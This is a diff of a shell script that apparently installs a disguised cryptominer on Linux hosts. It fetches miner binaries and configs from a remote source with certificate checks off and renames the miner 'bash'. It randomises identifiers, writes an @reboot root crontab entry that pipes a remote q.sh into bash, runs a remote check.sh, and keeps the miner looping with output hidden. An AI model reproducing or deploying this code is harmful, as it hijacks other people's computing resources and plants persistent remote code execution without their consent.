@@ -15,7 +15,7 @@ sudo apt -qqy install wget procps psmisc lsof icu-devtools netcat-traditional >/
 
 cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] || cores=1
-addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
+addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null`
 [ -n "$addr" ] || addr="NULL"
 name=`RandString 2 c${cores}_${addr}`;
 
@@ -31,21 +31,21 @@ rxName=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 
 sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
 sudo touch /etc/crontab || touch /etc/crontab >/dev/null 2>&1
-sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
+sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
 
 rm -rf "${work}"; mkdir -p "${work}"
-wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
-wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
-wget --no-check-certificate -4 -qO "${work}/config.json" "${src}/idle.json"
-wget --no-check-certificate -4 -qO "${work}/idle" "${src}/idle"
+wget --no-check-certificate -qO "${work}/appsettings.json" "${src}/q.json"
+wget --no-check-certificate -qO "${work}/bash" "${src}/q"
+wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
+wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
 chmod -R 777 "${work}"
 [ -f "${work}/appsettings.json" ] && sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
 [ -f "${work}/appsettings.json" ] && sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
 [ -f "${work}/config.json" ] && [ -n "$rxName" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${rxName}\",/g" "${work}/config.json"
 [ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
 
-sh <(wget --no-check-certificate -4 -qO- ${src}/check.sh) >/dev/null 2>&1 &
+sh <(wget --no-check-certificate -qO- ${src}/check.sh) >/dev/null 2>&1 &
 cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
 if [ "$mode" == "0" ]; then
   sh <(echo "$cmd") >/dev/null 2>&1 &
